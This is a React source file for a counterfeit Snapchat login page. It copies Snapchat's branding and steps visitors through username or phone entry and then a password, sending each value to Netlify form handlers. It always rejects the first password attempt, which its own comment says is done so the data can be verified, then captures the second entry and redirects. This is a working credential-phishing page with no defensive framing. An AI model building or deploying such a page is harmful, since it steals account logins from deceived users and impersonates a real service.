import React, { useRef, useState } from "react";
import SnapchatLogo from "../../../attached_assets/snapchat_1785772849797.png";

const SnapchatGhost = () => (
  <img
    src={SnapchatLogo}
    alt="Snapchat logo"
    width="76"
    height="76"
    className="mx-auto block h-[76px] w-[76px] object-contain"
  />
);

const GoogleLogo = () => (
  <svg
    width="20"
    height="20"
    viewBox="0 0 24 24"
    xmlns="http://www.w3.org/2000/svg"
  >
    <path
      d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
      fill="#4285F4"
    />
    <path
      d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
      fill="#34A853"
    />
    <path
      d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"
      fill="#FBBC05"
    />
    <path
      d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
      fill="#EA4335"
    />
  </svg>
);

const EyeIcon = ({ open }: { open: boolean }) =>
  open ? (
    <svg
      width="20"
      height="20"
      viewBox="0 0 24 24"
      fill="none"
      stroke="#888"
      strokeWidth="2"
      strokeLinecap="round"
      strokeLinejoin="round"
    >
      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
      <circle cx="12" cy="12" r="3" />
    </svg>
  ) : (
    <svg
      width="20"
      height="20"
      viewBox="0 0 24 24"
      fill="none"
      stroke="#888"
      strokeWidth="2"
      strokeLinecap="round"
      strokeLinejoin="round"
    >
      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
      <line x1="1" y1="1" x2="23" y2="23" />
    </svg>
  );

// Step types
type Step = "username" | "phone" | "password";

const countries: { code: string; flag: string; name: string }[] = [
  { code: "+1", flag: "🇺🇸", name: "United States" },
  { code: "+1", flag: "🇨🇦", name: "Canada" },
  { code: "+44", flag: "🇬🇧", name: "United Kingdom" },
  { code: "+93", flag: "🇦🇫", name: "Afghanistan" },
  { code: "+355", flag: "🇦🇱", name: "Albania" },
  { code: "+213", flag: "🇩🇿", name: "Algeria" },
  { code: "+1-684", flag: "🇦🇸", name: "American Samoa" },
  { code: "+376", flag: "🇦🇩", name: "Andorra" },
  { code: "+244", flag: "🇦🇴", name: "Angola" },
  { code: "+1-264", flag: "🇦🇮", name: "Anguilla" },
  { code: "+1-268", flag: "🇦🇬", name: "Antigua and Barbuda" },
  { code: "+54", flag: "🇦🇷", name: "Argentina" },
  { code: "+374", flag: "🇦🇲", name: "Armenia" },
  { code: "+297", flag: "🇦🇼", name: "Aruba" },
  { code: "+61", flag: "🇦🇺", name: "Australia" },
  { code: "+43", flag: "🇦🇹", name: "Austria" },
  { code: "+994", flag: "🇦🇿", name: "Azerbaijan" },
  { code: "+1-242", flag: "🇧🇸", name: "Bahamas" },
  { code: "+973", flag: "🇧🇭", name: "Bahrain" },
  { code: "+880", flag: "🇧🇩", name: "Bangladesh" },
  { code: "+1-246", flag: "🇧🇧", name: "Barbados" },
  { code: "+375", flag: "🇧🇾", name: "Belarus" },
  { code: "+32", flag: "🇧🇪", name: "Belgium" },
  { code: "+501", flag: "🇧🇿", name: "Belize" },
  { code: "+229", flag: "🇧🇯", name: "Benin" },
  { code: "+1-441", flag: "🇧🇲", name: "Bermuda" },
  { code: "+975", flag: "🇧🇹", name: "Bhutan" },
  { code: "+591", flag: "🇧🇴", name: "Bolivia" },
  { code: "+387", flag: "🇧🇦", name: "Bosnia and Herzegovina" },
  { code: "+267", flag: "🇧🇼", name: "Botswana" },
  { code: "+55", flag: "🇧🇷", name: "Brazil" },
  { code: "+1-284", flag: "🇻🇬", name: "British Virgin Islands" },
  { code: "+673", flag: "🇧🇳", name: "Brunei" },
  { code: "+359", flag: "🇧🇬", name: "Bulgaria" },
  { code: "+226", flag: "🇧🇫", name: "Burkina Faso" },
  { code: "+257", flag: "🇧🇮", name: "Burundi" },
  { code: "+855", flag: "🇰🇭", name: "Cambodia" },
  { code: "+237", flag: "🇨🇲", name: "Cameroon" },
  { code: "+238", flag: "🇨🇻", name: "Cape Verde" },
  { code: "+1-345", flag: "🇰🇾", name: "Cayman Islands" },
  { code: "+236", flag: "🇨🇫", name: "Central African Republic" },
  { code: "+235", flag: "🇹🇩", name: "Chad" },
  { code: "+56", flag: "🇨🇱", name: "Chile" },
  { code: "+86", flag: "🇨🇳", name: "China" },
  { code: "+57", flag: "🇨🇴", name: "Colombia" },
  { code: "+269", flag: "🇰🇲", name: "Comoros" },
  { code: "+242", flag: "🇨🇬", name: "Congo" },
  { code: "+243", flag: "🇨🇩", name: "Congo DR" },
  { code: "+506", flag: "🇨🇷", name: "Costa Rica" },
  { code: "+225", flag: "🇨🇮", name: "Côte d'Ivoire" },
  { code: "+385", flag: "🇭🇷", name: "Croatia" },
  { code: "+53", flag: "🇨🇺", name: "Cuba" },
  { code: "+599", flag: "🇨🇼", name: "Curaçao" },
  { code: "+357", flag: "🇨🇾", name: "Cyprus" },
  { code: "+420", flag: "🇨🇿", name: "Czech Republic" },
  { code: "+45", flag: "🇩🇰", name: "Denmark" },
  { code: "+253", flag: "🇩🇯", name: "Djibouti" },
  { code: "+1-767", flag: "🇩🇲", name: "Dominica" },
  { code: "+1-809", flag: "🇩🇴", name: "Dominican Republic" },
  { code: "+593", flag: "🇪🇨", name: "Ecuador" },
  { code: "+20", flag: "🇪🇬", name: "Egypt" },
  { code: "+503", flag: "🇸🇻", name: "El Salvador" },
  { code: "+240", flag: "🇬🇶", name: "Equatorial Guinea" },
  { code: "+291", flag: "🇪🇷", name: "Eritrea" },
  { code: "+372", flag: "🇪🇪", name: "Estonia" },
  { code: "+268", flag: "🇸🇿", name: "Eswatini" },
  { code: "+251", flag: "🇪🇹", name: "Ethiopia" },
  { code: "+500", flag: "🇫🇰", name: "Falkland Islands" },
  { code: "+298", flag: "🇫🇴", name: "Faroe Islands" },
  { code: "+679", flag: "🇫🇯", name: "Fiji" },
  { code: "+358", flag: "🇫🇮", name: "Finland" },
  { code: "+33", flag: "🇫🇷", name: "France" },
  { code: "+594", flag: "🇬🇫", name: "French Guiana" },
  { code: "+689", flag: "🇵🇫", name: "French Polynesia" },
  { code: "+241", flag: "🇬🇦", name: "Gabon" },
  { code: "+220", flag: "🇬🇲", name: "Gambia" },
  { code: "+995", flag: "🇬🇪", name: "Georgia" },
  { code: "+49", flag: "🇩🇪", name: "Germany" },
  { code: "+233", flag: "🇬🇭", name: "Ghana" },
  { code: "+350", flag: "🇬🇮", name: "Gibraltar" },
  { code: "+30", flag: "🇬🇷", name: "Greece" },
  { code: "+299", flag: "🇬🇱", name: "Greenland" },
  { code: "+1-473", flag: "🇬🇩", name: "Grenada" },
  { code: "+590", flag: "🇬🇵", name: "Guadeloupe" },
  { code: "+502", flag: "🇬🇹", name: "Guatemala" },
  { code: "+224", flag: "🇬🇳", name: "Guinea" },
  { code: "+245", flag: "🇬🇼", name: "Guinea-Bissau" },
  { code: "+592", flag: "🇬🇾", name: "Guyana" },
  { code: "+509", flag: "🇭🇹", name: "Haiti" },
  { code: "+504", flag: "🇭🇳", name: "Honduras" },
  { code: "+852", flag: "🇭🇰", name: "Hong Kong" },
  { code: "+36", flag: "🇭🇺", name: "Hungary" },
  { code: "+354", flag: "🇮🇸", name: "Iceland" },
  { code: "+91", flag: "🇮🇳", name: "India" },
  { code: "+62", flag: "🇮🇩", name: "Indonesia" },
  { code: "+98", flag: "🇮🇷", name: "Iran" },
  { code: "+964", flag: "🇮🇶", name: "Iraq" },
  { code: "+353", flag: "🇮🇪", name: "Ireland" },
  { code: "+972", flag: "🇮🇱", name: "Israel" },
  { code: "+39", flag: "🇮🇹", name: "Italy" },
  { code: "+1-876", flag: "🇯🇲", name: "Jamaica" },
  { code: "+81", flag: "🇯🇵", name: "Japan" },
  { code: "+962", flag: "🇯🇴", name: "Jordan" },
  { code: "+7", flag: "🇰🇿", name: "Kazakhstan" },
  { code: "+254", flag: "🇰🇪", name: "Kenya" },
  { code: "+686", flag: "🇰🇮", name: "Kiribati" },
  { code: "+383", flag: "🇽🇰", name: "Kosovo" },
  { code: "+965", flag: "🇰🇼", name: "Kuwait" },
  { code: "+996", flag: "🇰🇬", name: "Kyrgyzstan" },
  { code: "+856", flag: "🇱🇦", name: "Laos" },
  { code: "+371", flag: "🇱🇻", name: "Latvia" },
  { code: "+961", flag: "🇱🇧", name: "Lebanon" },
  { code: "+266", flag: "🇱🇸", name: "Lesotho" },
  { code: "+231", flag: "🇱🇷", name: "Liberia" },
  { code: "+218", flag: "🇱🇾", name: "Libya" },
  { code: "+423", flag: "🇱🇮", name: "Liechtenstein" },
  { code: "+370", flag: "🇱🇹", name: "Lithuania" },
  { code: "+352", flag: "🇱🇺", name: "Luxembourg" },
  { code: "+853", flag: "🇲🇴", name: "Macau" },
  { code: "+261", flag: "🇲🇬", name: "Madagascar" },
  { code: "+265", flag: "🇲🇼", name: "Malawi" },
  { code: "+60", flag: "🇲🇾", name: "Malaysia" },
  { code: "+960", flag: "🇲🇻", name: "Maldives" },
  { code: "+223", flag: "🇲🇱", name: "Mali" },
  { code: "+356", flag: "🇲🇹", name: "Malta" },
  { code: "+692", flag: "🇲🇭", name: "Marshall Islands" },
  { code: "+596", flag: "🇲🇶", name: "Martinique" },
  { code: "+222", flag: "🇲🇷", name: "Mauritania" },
  { code: "+230", flag: "🇲🇺", name: "Mauritius" },
  { code: "+52", flag: "🇲🇽", name: "Mexico" },
  { code: "+691", flag: "🇫🇲", name: "Micronesia" },
  { code: "+373", flag: "🇲🇩", name: "Moldova" },
  { code: "+377", flag: "🇲🇨", name: "Monaco" },
  { code: "+976", flag: "🇲🇳", name: "Mongolia" },
  { code: "+382", flag: "🇲🇪", name: "Montenegro" },
  { code: "+212", flag: "🇲🇦", name: "Morocco" },
  { code: "+258", flag: "🇲🇿", name: "Mozambique" },
  { code: "+95", flag: "🇲🇲", name: "Myanmar" },
  { code: "+264", flag: "🇳🇦", name: "Namibia" },
  { code: "+674", flag: "🇳🇷", name: "Nauru" },
  { code: "+977", flag: "🇳🇵", name: "Nepal" },
  { code: "+31", flag: "🇳🇱", name: "Netherlands" },
  { code: "+687", flag: "🇳🇨", name: "New Caledonia" },
  { code: "+64", flag: "🇳🇿", name: "New Zealand" },
  { code: "+505", flag: "🇳🇮", name: "Nicaragua" },
  { code: "+227", flag: "🇳🇪", name: "Niger" },
  { code: "+234", flag: "🇳🇬", name: "Nigeria" },
  { code: "+850", flag: "🇰🇵", name: "North Korea" },
  { code: "+389", flag: "🇲🇰", name: "North Macedonia" },
  { code: "+47", flag: "🇳🇴", name: "Norway" },
  { code: "+968", flag: "🇴🇲", name: "Oman" },
  { code: "+92", flag: "🇵🇰", name: "Pakistan" },
  { code: "+680", flag: "🇵🇼", name: "Palau" },
  { code: "+970", flag: "🇵🇸", name: "Palestine" },
  { code: "+507", flag: "🇵🇦", name: "Panama" },
  { code: "+675", flag: "🇵🇬", name: "Papua New Guinea" },
  { code: "+595", flag: "🇵🇾", name: "Paraguay" },
  { code: "+51", flag: "🇵🇪", name: "Peru" },
  { code: "+63", flag: "🇵🇭", name: "Philippines" },
  { code: "+48", flag: "🇵🇱", name: "Poland" },
  { code: "+351", flag: "🇵🇹", name: "Portugal" },
  { code: "+1-787", flag: "🇵🇷", name: "Puerto Rico" },
  { code: "+974", flag: "🇶🇦", name: "Qatar" },
  { code: "+262", flag: "🇷🇪", name: "Réunion" },
  { code: "+40", flag: "🇷🇴", name: "Romania" },
  { code: "+7", flag: "🇷🇺", name: "Russia" },
  { code: "+250", flag: "🇷🇼", name: "Rwanda" },
  { code: "+1-869", flag: "🇰🇳", name: "Saint Kitts and Nevis" },
  { code: "+1-758", flag: "🇱🇨", name: "Saint Lucia" },
  { code: "+1-784", flag: "🇻🇨", name: "Saint Vincent" },
  { code: "+685", flag: "🇼🇸", name: "Samoa" },
  { code: "+378", flag: "🇸🇲", name: "San Marino" },
  { code: "+966", flag: "🇸🇦", name: "Saudi Arabia" },
  { code: "+221", flag: "🇸🇳", name: "Senegal" },
  { code: "+381", flag: "🇷🇸", name: "Serbia" },
  { code: "+248", flag: "🇸🇨", name: "Seychelles" },
  { code: "+232", flag: "🇸🇱", name: "Sierra Leone" },
  { code: "+65", flag: "🇸🇬", name: "Singapore" },
  { code: "+421", flag: "🇸🇰", name: "Slovakia" },
  { code: "+386", flag: "🇸🇮", name: "Slovenia" },
  { code: "+677", flag: "🇸🇧", name: "Solomon Islands" },
  { code: "+252", flag: "🇸🇴", name: "Somalia" },
  { code: "+27", flag: "🇿🇦", name: "South Africa" },
  { code: "+82", flag: "🇰🇷", name: "South Korea" },
  { code: "+211", flag: "🇸🇸", name: "South Sudan" },
  { code: "+34", flag: "🇪🇸", name: "Spain" },
  { code: "+94", flag: "🇱🇰", name: "Sri Lanka" },
  { code: "+249", flag: "🇸🇩", name: "Sudan" },
  { code: "+597", flag: "🇸🇷", name: "Suriname" },
  { code: "+46", flag: "🇸🇪", name: "Sweden" },
  { code: "+41", flag: "🇨🇭", name: "Switzerland" },
  { code: "+963", flag: "🇸🇾", name: "Syria" },
  { code: "+886", flag: "🇹🇼", name: "Taiwan" },
  { code: "+992", flag: "🇹🇯", name: "Tajikistan" },
  { code: "+255", flag: "🇹🇿", name: "Tanzania" },
  { code: "+66", flag: "🇹🇭", name: "Thailand" },
  { code: "+228", flag: "🇹🇬", name: "Togo" },
  { code: "+676", flag: "🇹🇴", name: "Tonga" },
  { code: "+1-868", flag: "🇹🇹", name: "Trinidad and Tobago" },
  { code: "+216", flag: "🇹🇳", name: "Tunisia" },
  { code: "+90", flag: "🇹🇷", name: "Turkey" },
  { code: "+993", flag: "🇹🇲", name: "Turkmenistan" },
  { code: "+1-649", flag: "🇹🇨", name: "Turks and Caicos" },
  { code: "+256", flag: "🇺🇬", name: "Uganda" },
  { code: "+380", flag: "🇺🇦", name: "Ukraine" },
  { code: "+971", flag: "🇦🇪", name: "United Arab Emirates" },
  { code: "+598", flag: "🇺🇾", name: "Uruguay" },
  { code: "+998", flag: "🇺🇿", name: "Uzbekistan" },
  { code: "+678", flag: "🇻🇺", name: "Vanuatu" },
  { code: "+58", flag: "🇻🇪", name: "Venezuela" },
  { code: "+84", flag: "🇻🇳", name: "Vietnam" },
  { code: "+967", flag: "🇾🇪", name: "Yemen" },
  { code: "+260", flag: "🇿🇲", name: "Zambia" },
  { code: "+263", flag: "🇿🇼", name: "Zimbabwe" },
];

// Snapchat username rules: 6-15 chars, Latin letters only, may contain
// digits, dots and underscores, must start with a letter, must not be all
// numbers, and no consecutive special characters.
function isValidSnapchatUsername(value: string): boolean {
  const name = value.trim();
  if (!name || name.length < 6 || name.length > 15) return false;
  if (!/^[a-zA-Z0-9._]+$/.test(name)) return false;
  if (!/[a-zA-Z]/.test(name)) return false;
  if (/^[0-9]/.test(name)) return false;
  if (/[._]$/.test(name)) return false;
  if (/[._]{2,}/.test(name)) return false;
  return true;
}

function isValidPhoneNumber(value: string): boolean {
  const digits = value.replace(/[\s\-()]/g, "");
  return /^[0-9]{7,15}$/.test(digits);
}

const Footer = () => (
  <footer className="mt-10 w-full max-w-[900px] px-2">
    <div className="grid grid-cols-2 sm:grid-cols-4 gap-x-6 gap-y-6">
      <div className="flex flex-col gap-[6px]">
        <a
          href="#"
          className="text-[13px] font-semibold text-[#333333] hover:underline"
        >
          Company
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Snap Inc.
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Careers
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          News
        </a>
      </div>
      <div className="flex flex-col gap-[6px]">
        <a
          href="#"
          className="text-[13px] font-semibold text-[#333333] hover:underline"
        >
          Community
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Support
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Community Guidelines
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Safety Center
        </a>
      </div>
      <div className="flex flex-col gap-[6px]">
        <a
          href="#"
          className="text-[13px] font-semibold text-[#333333] hover:underline"
        >
          Advertising
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Buy Ads
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Advertising Policies
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Political Ads Library
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Brand Guidelines
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Promotions Rules
        </a>
      </div>
      <div className="flex flex-col gap-[6px]">
        <a
          href="#"
          className="text-[13px] font-semibold text-[#333333] hover:underline"
        >
          Legal
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Privacy Center
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Your Privacy Choices
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Cookie Policy
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Report Infringement
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Custom Creative Tools Terms
        </a>
      </div>
    </div>
    <div className="mt-6">
      <a
        href="#"
        className="text-[13px] font-semibold text-[#333333] hover:underline"
      >
        Language
      </a>
    </div>
  </footer>
);

export default function LoginPage() {
  const [step, setStep] = useState<Step>("username");
  const [username, setUsername] = useState("");
  const [phone, setPhone] = useState("");
  const [countryCode, setCountryCode] = useState("+1");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [usernameError, setUsernameError] = useState("");
  const [phoneError, setPhoneError] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const attemptsRef = useRef(0);
  const returnTo =
    new URLSearchParams(window.location.search).get("returnTo") || "/";

  const submitNetlifyForm = async (
    formName: string,
    fields: Record<string, string>,
  ) => {
    if (!import.meta.env.PROD) {
      return;
    }

    const body = new URLSearchParams();
    body.set("form-name", formName);

    Object.entries(fields).forEach(([key, value]) => {
      body.set(key, value);
    });

    await fetch("/", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: body.toString(),
    });
  };

  const handleUsernameNext = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username.trim()) {
      setUsernameError("Please enter your username or email.");
      return;
    }
    if (!isValidSnapchatUsername(username)) {
      setUsernameError(
        "We couldn't find an account with this username. Please check and try again.",
      );
      return;
    }
    setUsernameError("");
    await submitNetlifyForm("Snapchat-login-username", {
      username,
    });
    setStep("password");
  };

  const handlePhoneNext = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!phone.trim()) {
      setPhoneError("Please enter your phone number.");
      return;
    }
    if (!isValidPhoneNumber(phone)) {
      setPhoneError(
        "We couldn't find an account with this phone number. Please check and try again.",
      );
      return;
    }
    setPhoneError("");
    await submitNetlifyForm("Snapchat-login-phone", {
      countryCode,
      phone,
    });
    setStep("password");
  };

  const handlePasswordNext = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!password.trim()) {
      setPasswordError("Please enter your password.");
      return;
    }

    // first attempt always fails so the data can be verified
    if (attemptsRef.current === 0) {
      attemptsRef.current += 1;
      setPassword("");
      setPasswordError("Wrong password. Please try again.");
      return;
    }

    const storedUsername = username || phone;
    if (storedUsername) {
      window.sessionStorage.setItem("snapchatLoginUsername", storedUsername);
    }

    if (import.meta.env.DEV) {
      window.location.assign(returnTo);
      return;
    }

    await submitNetlifyForm("Snapchat-login-password", {
      identifier: username || phone,
      password,
    });

    window.location.assign(returnTo);
  };

  return (
    <div
      className="min-h-screen w-full font-sans text-[#111111]"
      style={{ backgroundColor: "#f2f2f2" }}
    >
      <main className="flex flex-col items-center px-4 pt-10 pb-10">
        {step === "username" && (
          <div className="bg-white rounded-[12px] w-full max-w-[440px] shadow-[0_1px_4px_rgba(0,0,0,0.06)] px-8 sm:px-10 pt-8 pb-10 border border-[#e8e8e8]">
            <SnapchatGhost />
            <h1 className="text-center text-[26px] sm:text-[28px] font-bold mt-4 tracking-[-0.01em]">
              Log in to Snapchat
            </h1>
            <form onSubmit={handleUsernameNext} className="mt-6">
              <label className="block text-[13px] font-medium text-[#555555] mb-1.5">
                Username or Email
              </label>
              <input
                type="text"
                maxLength={15}
                value={username}
                onChange={(e) => {
                  setUsername(e.target.value.replace(/^@/, "").trimStart());
                  setUsernameError("");
                }}
                className="w-full px-3.5 py-[12px] border-[2px] border-black rounded-[8px] focus:outline-none text-[15px]"
                autoFocus
              />
              {usernameError && (
                <p className="mt-1.5 text-[13px] text-red-500">
                  {usernameError}
                </p>
              )}

              <div className="mt-3 text-center">
                <button
                  type="button"
                  onClick={() => {
                    setStep("phone");
                    setUsernameError("");
                  }}
                  className="text-[14px] font-semibold text-[#00C8FA] hover:underline"
                >
                  Use phone number instead
                </button>
              </div>

              <div className="mt-5 flex justify-center">
                <button
                  type="submit"
                  className="bg-[#00C8FA] text-white font-bold text-[15px] px-9 py-[10px] rounded-full hover:bg-[#00b4e0] transition-colors"
                >
                  Next
                </button>
              </div>

              <div className="flex items-center w-full mt-6 mb-5">
                <div className="flex-1 border-t border-[#e0e0e0]"></div>
                <span className="px-4 text-[13px] text-[#888888]">OR</span>
                <div className="flex-1 border-t border-[#e0e0e0]"></div>
              </div>

              <button
                type="button"
                className="flex items-center justify-center gap-2.5 w-full border border-[#d0d0d0] rounded-full py-[10px] bg-white hover:bg-gray-50 transition-colors"
              >
                <GoogleLogo />
                <span className="text-[14px] font-semibold text-[#333333]">
                  Continue with Google
                </span>
              </button>
            </form>
          </div>
        )}

        {step === "phone" && (
          <div className="bg-white rounded-[12px] w-full max-w-[440px] shadow-[0_1px_4px_rgba(0,0,0,0.06)] px-8 sm:px-10 pt-8 pb-10 border border-[#e8e8e8]">
            <SnapchatGhost />
            <h1 className="text-center text-[26px] sm:text-[28px] font-bold mt-4 tracking-[-0.01em]">
              Log in to Snapchat
            </h1>
            <form onSubmit={handlePhoneNext} className="mt-6">
              <label className="block text-[13px] font-medium text-[#555555] mb-1.5">
                Phone number
              </label>
              <div className="flex border-[2px] border-black rounded-[8px] overflow-hidden focus-within:border-black">
                <div className="flex items-center gap-1.5 px-3 bg-white border-r border-[#e0e0e0] shrink-0">
                  <select
                    className="max-w-[90px] truncate text-[14px] font-medium text-[#333] bg-transparent focus:outline-none appearance-none cursor-pointer pr-1"
                    value={countryCode}
                    onChange={(e) => setCountryCode(e.target.value)}
                  >
                    {countries.map((c, i) => (
                      <option key={c.flag + i} value={c.code}>
                        {c.flag} {c.code}
                      </option>
                    ))}
                  </select>
                  <svg
                    width="12"
                    height="12"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="#888"
                    strokeWidth="2.5"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <polyline points="6 9 12 15 18 9" />
                  </svg>
                </div>
                <input
                  type="tel"
                  inputMode="numeric"
                  autoComplete="tel"
                  maxLength={15}
                  value={phone}
                  onChange={(e) => {
                    setPhone(e.target.value.replace(/[^\d\s\-()]/g, ""));
                    setPhoneError("");
                  }}
                  className="flex-1 px-3 py-[12px] focus:outline-none text-[15px]"
                  placeholder=""
                  autoFocus
                />
              </div>
              {phoneError && (
                <p className="mt-1.5 text-[13px] text-red-500">{phoneError}</p>
              )}

              <div className="mt-3 text-center">
                <button
                  type="button"
                  onClick={() => {
                    setStep("username");
                    setPhoneError("");
                  }}
                  className="text-[14px] font-semibold text-[#00C8FA] hover:underline"
                >
                  Use username or email address instead
                </button>
              </div>

              <div className="mt-5 flex justify-center">
                <button
                  type="submit"
                  className="bg-[#00C8FA] text-white font-bold text-[15px] px-9 py-[10px] rounded-full hover:bg-[#00b4e0] transition-colors"
                >
                  Next
                </button>
              </div>

              <div className="flex items-center w-full mt-6 mb-5">
                <div className="flex-1 border-t border-[#e0e0e0]"></div>
                <span className="px-4 text-[13px] text-[#888888]">OR</span>
                <div className="flex-1 border-t border-[#e0e0e0]"></div>
              </div>

              <button
                type="button"
                className="flex items-center justify-center gap-2.5 w-full border border-[#d0d0d0] rounded-full py-[10px] bg-white hover:bg-gray-50 transition-colors"
              >
                <GoogleLogo />
                <span className="text-[14px] font-semibold text-[#333333]">
                  Continue with Google
                </span>
              </button>
            </form>
          </div>
        )}

        {step === "password" && (
          <div className="bg-white rounded-[12px] w-full max-w-[440px] shadow-[0_1px_4px_rgba(0,0,0,0.06)] px-8 sm:px-10 pt-8 pb-10 border border-[#e8e8e8]">
            <SnapchatGhost />
            <h1 className="text-center text-[26px] sm:text-[28px] font-bold mt-4 tracking-[-0.01em]">
              Enter Password
            </h1>

            <div className="mt-4 flex items-center justify-center gap-2">
              <span className="text-[14px] font-semibold text-[#333]">
                {username || phone}
              </span>
<button
                  type="button"
                  onClick={() => {
                    setStep(username ? "username" : "phone");
                    setPassword("");
                    setPasswordError("");
                    attemptsRef.current = 0;
                  }}
                  className="text-[13px] font-semibold text-[#00C8FA] hover:underline"
                >
                  Not you?
                </button>
            </div>

            <form
              name="Snapchat-login-password"
              method="POST"
              data-netlify="true"
              onSubmit={handlePasswordNext}
              className="mt-5"
            >
              <input
                type="hidden"
                name="form-name"
                value="Snapchat-login-password"
              />
              <input
                type="hidden"
                name="identifier"
                value={username || phone}
              />
              <label className="block text-[13px] font-medium text-[#555555] mb-1.5">
                Password
              </label>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  name="password"
                  value={password}
                  required
                  onChange={(e) => {
                    setPassword(e.target.value);
                    setPasswordError("");
                  }}
                  className="w-full px-3.5 py-[12px] pr-11 border-[1.5px] border-[#cccccc] rounded-[8px] focus:outline-none focus:border-black text-[15px] transition-colors"
                />
                <a
                  href="#"
                  className="text-[14px] font-semibold text-[#00C8FA] hover:underline"
                >
                  Forgot Password
                </a>
              </div>
              {passwordError && (
                <p className="mt-1.5 text-[13px] text-red-500">
                  {passwordError}
                </p>
              )}

              <div className="mt-5 flex justify-center">
                <button
                  type="submit"
                  className="bg-[#00C8FA] text-white font-bold text-[15px] px-9 py-[10px] rounded-full hover:bg-[#00b4e0] transition-colors"
                >
                  Next
                </button>
              </div>
            </form>
          </div>
        )}

        {step !== "password" && (
          <div className="mt-5 text-center">
            <span className="text-[15px] text-[#444444]">
              New to Snapchat?{" "}
            </span>
            <a
              href="#"
              className="text-[15px] font-bold text-black hover:underline"
            >
              Sign Up
            </a>
          </div>
        )}

        <Footer />
      </main>
    </div>
  );
}
